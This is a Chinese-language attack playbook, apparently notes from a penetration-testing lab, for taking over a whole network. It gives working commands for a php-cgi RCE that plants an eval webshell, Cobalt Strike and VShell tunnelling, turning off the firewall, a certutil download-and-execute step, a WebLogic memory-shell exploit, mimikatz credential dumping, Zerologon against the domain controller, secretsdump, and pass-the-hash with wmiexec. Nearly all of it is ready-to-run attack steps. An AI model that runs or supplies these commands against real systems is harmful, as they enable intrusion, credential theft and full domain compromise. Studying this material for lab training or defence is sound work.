```py
【考点】
1. 外网边界突破  
   - naabu / fscan 资产与端口测绘  
   - XAMPP php-cgi RCE（CVE-2012-1823 变种）→ 写 WebShell → 蚁剑管理  

2. C2 隧道化横向  
   - CS / VShell 上线；反向 & 正向木马混合使用  
   - Proxifier + VShell 内网 Socks 隧道，突破网段隔离  

3. 多层网段接力  
   10.10.0.11 → 192.168.2.0/24 → 192.168.3.0/24 → 192.168.10.0/24  
   每段均“关防火墙 + 正向马 + 命令执行下载器”三板斧  

4. 经典漏洞利用  
   - WebLogic 7001 未打补丁 → 注入内存马（wls-wsat / bea_wls_internal）  
   - CVE-2020-1472 Zerologon → 一键打域控 → secretsdump 拿 Hash → PTH 登录  

5. 凭据收割与重用  
   mimikatz “sekurlsa::logonpasswords” 读明文 → Admin12345 复用到 192.168.10.x  

6. 域内批量控制思路  
   wmiexec.py Hash/明文传递 → 批量上线；或打包 war 到 WebLogic 再下拉 CS-Beacon 实现域控上线  

【命令】
# 1. 端口&资产扫描
naabu -host 10.10.0.11 -p 1-65535
fscan -h 10.10.0.11

# 2. php-cgi RCE 写马 --> 路径根据phpinfo泄露
curl -i -X POST "http://10.10.0.11/php-cgi/php-cgi.exe?%add+cgi.force_redirect%3d0+%add+allow_url_include%3don+%add+auto_prepend_file%3dphp://input" \
     -d "<?php file_put_contents('C:\\xampp\\htdocs\\redred.php','<?php eval($_POST[\"pass\"]);?>');?>"

# 3. CS 上线
./teamserver <VPS-IP> admin123          # VPS 端
# 生成 HTTP Beacon → upload via 蚁剑 → 靶机执行

# 4. 关防火墙&快速执行
netsh advfirewall set allprofiles state off --------------------->这个习惯养成!!!!!!!!!
certutil -urlcache -split -f http://192.168.2.3/4488.exe C:/4488.exe && C:/4488.exe

# 5. VShell 隧道（Socks5）
# 服务端
./vshell -listen 0.0.0.0:4444
# 客户端
./vshell -connect <VPS>:4444 -socks 127.0.0.1:1080
proxifier 代理 127.0.0.1:1080

# 6. WebLogic 内存马
java -jar weblogic_exploit.jar http://192.168.3.34:7001 bea_wls_internal/applicationSingletonProvider
# 密码 hackfun1024  密钥 key

# 7. 凭据导出
mimikatz.x64.exe "privilege::debug" "sekurlsa::logonpasswords full" exit > passwords.txt


"*****************************重点***************************************"
# 8. Zerologon 打域控 
python CVE-2020-1472_Exploit.py DC 192.168.10.10
python secretsdump.py DC\$@192.168.10.10 -just-dc -no-pass
python wmiexec.py -hashes :<NTLM> xiaodi/administrator@192.168.10.10 -codec gbk

# 9. 批量网段扫描
fscan -h 192.168.10.1/24 -np

【一句话思路】
“外网洞打穿 → 反向马进内网 → 隧道代理跨段 → 经典漏洞/弱口令/ Zerologon 接力 → 域管到手再批量下发正向 Beacon，完成整网控制。”
```

